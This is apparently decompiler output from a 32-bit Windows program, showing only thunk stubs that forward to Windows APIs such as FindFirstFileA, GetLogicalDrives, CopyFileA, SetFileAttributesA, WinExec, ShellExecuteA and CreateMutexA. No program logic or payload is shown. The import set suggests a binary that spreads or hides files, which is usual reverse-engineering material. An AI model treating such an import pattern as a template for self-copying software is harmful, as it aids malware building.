// WARNING: Exceeded maximum restarts with more pending

void __cdecl _abort(void)

{
                    // WARNING: Could not recover jumptable at 0x0040b580. Too many branches
                    // WARNING: Treating indirect jump as call
  abort();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _fflush(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b590. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fflush();
  return iVar1;
}



int _GetKeyboardType_4(int nTypeFlag)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b5a0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetKeyboardType(nTypeFlag);
  return iVar1;
}



int _MessageBoxA_16(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b5b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl _wsprintfA(LPSTR param_1,LPCSTR param_2,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b5c0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = wsprintfA();
  return iVar1;
}



LPTOP_LEVEL_EXCEPTION_FILTER
_SetUnhandledExceptionFilter_4(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)

{
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b5d0. Too many branches
                    // WARNING: Treating indirect jump as call
  pPVar1 = SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
  return pPVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void _ExitProcess_4(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x0040b5e0. Too many branches
                    // WARNING: Treating indirect jump as call
  ExitProcess();
  return;
}



DWORD _GetLastError_0(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b5f0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



void _Sleep_4(DWORD dwMilliseconds)

{
                    // WARNING: Could not recover jumptable at 0x0040b600. Too many branches
                    // WARNING: Treating indirect jump as call
  Sleep(dwMilliseconds);
  return;
}



BOOL _SetFileAttributesA_8(LPCSTR lpFileName,DWORD dwFileAttributes)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b610. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetFileAttributesA(lpFileName,dwFileAttributes);
  return BVar1;
}



HFILE _OpenFile_12(LPCSTR lpFileName,LPOFSTRUCT lpReOpenBuff,UINT uStyle)

{
  HFILE HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b620. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = OpenFile(lpFileName,lpReOpenBuff,uStyle);
  return HVar1;
}



BOOL _CloseHandle_4(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b630. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



UINT _GetWindowsDirectoryA_8(LPSTR lpBuffer,UINT uSize)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b640. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetWindowsDirectoryA(lpBuffer,uSize);
  return UVar1;
}



HANDLE _FindFirstFileA_8(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b650. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  return pvVar1;
}



BOOL _FindNextFileA_8(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b660. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindNextFileA(hFindFile,lpFindFileData);
  return BVar1;
}



BOOL _FindClose_4(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b670. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose(hFindFile);
  return BVar1;
}



HFILE __lopen_8(LPCSTR lpPathName,int iReadWrite)

{
  HFILE HVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b680. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = _lopen(lpPathName,iReadWrite);
  return HVar1;
}



DWORD _GetFileSize_8(HANDLE hFile,LPDWORD lpFileSizeHigh)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b690. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileSize(hFile,lpFileSizeHigh);
  return DVar1;
}



DWORD _GetLogicalDrives_0(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6a0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLogicalDrives();
  return DVar1;
}



HANDLE _CreateFileA_28(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
                      LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
                      DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6b0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}



DWORD _GetVersion_0(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6c0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetVersion();
  return DVar1;
}



HMODULE _GetModuleHandleA_4(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6d0. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



FARPROC _GetProcAddress_8(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6e0. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = GetProcAddress(hModule,lpProcName);
  return pFVar1;
}



HANDLE _GetCurrentProcess_0(void)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b6f0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetCurrentProcess();
  return pvVar1;
}



BOOL _GetComputerNameA_8(LPSTR lpBuffer,LPDWORD nSize)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b700. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetComputerNameA(lpBuffer,nSize);
  return BVar1;
}



void _GetSystemInfo_4(LPSYSTEM_INFO lpSystemInfo)

{
                    // WARNING: Could not recover jumptable at 0x0040b710. Too many branches
                    // WARNING: Treating indirect jump as call
  GetSystemInfo(lpSystemInfo);
  return;
}



DWORD _GetModuleFileNameA_12(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b720. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



UINT _WinExec_8(LPCSTR lpCmdLine,UINT uCmdShow)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b730. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = WinExec(lpCmdLine,uCmdShow);
  return UVar1;
}



HLOCAL _LocalAlloc_8(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b740. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalAlloc(uFlags,uBytes);
  return pvVar1;
}



HLOCAL _LocalFree_4(HLOCAL hMem)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b750. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalFree(hMem);
  return pvVar1;
}



HANDLE _CreateMutexA_12(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b760. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateMutexA(lpMutexAttributes,bInitialOwner,lpName);
  return pvVar1;
}



BOOL _ReleaseMutex_4(HANDLE hMutex)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b770. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReleaseMutex(hMutex);
  return BVar1;
}



LPVOID _VirtualAlloc_16(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b780. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = VirtualAlloc(lpAddress,dwSize,flAllocationType,flProtect);
  return pvVar1;
}



BOOL _CopyFileA_12(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b790. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CopyFileA(lpExistingFileName,lpNewFileName,bFailIfExists);
  return BVar1;
}



LPSTR _GetCommandLineA_0(void)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b7a0. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetCommandLineA();
  return pCVar1;
}



void _GetStartupInfoA_4(LPSTARTUPINFOA lpStartupInfo)

{
                    // WARNING: Could not recover jumptable at 0x0040b7b0. Too many branches
                    // WARNING: Treating indirect jump as call
  GetStartupInfoA(lpStartupInfo);
  return;
}



void _SHGetFolderPathA_20(void)

{
                    // WARNING: Could not recover jumptable at 0x0040b7f0. Too many branches
                    // WARNING: Treating indirect jump as call
  SHGetFolderPathA();
  return;
}



HINSTANCE _ShellExecuteA_24(HWND hwnd,LPCSTR lpOperation,LPCSTR lpFile,LPCSTR lpParameters,
                           LPCSTR lpDirectory,INT nShowCmd)

{
  HINSTANCE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040b800. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = ShellExecuteA(hwnd,lpOperation,lpFile,lpParameters,lpDirectory,nShowCmd);
  return pHVar1;
}



int __cdecl _feof(FILE *_File)

{
  return _File->_flag & 0x10;
}


